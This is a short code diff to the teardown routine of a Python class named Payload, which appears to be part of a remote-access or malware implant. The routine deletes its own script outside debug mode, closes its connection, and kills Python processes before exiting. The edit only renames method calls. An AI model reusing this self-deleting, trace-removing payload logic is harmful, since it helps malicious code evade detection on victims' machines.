@@ -489,8 +489,8 @@ class Payload():
             if not _debug:
                 delete(sys.argv[0])
         finally:
-            shutdown = threading.Thread(target=self.get_shutdown)
-            taskkill = threading.Thread(target=self.ps, args=('kill python',))
+            shutdown = threading.Thread(target=self.connection.close)
+            taskkill = threading.Thread(target=self.process, args=('kill python',))
             shutdown.start()
             taskkill.start()
             sys.exit()
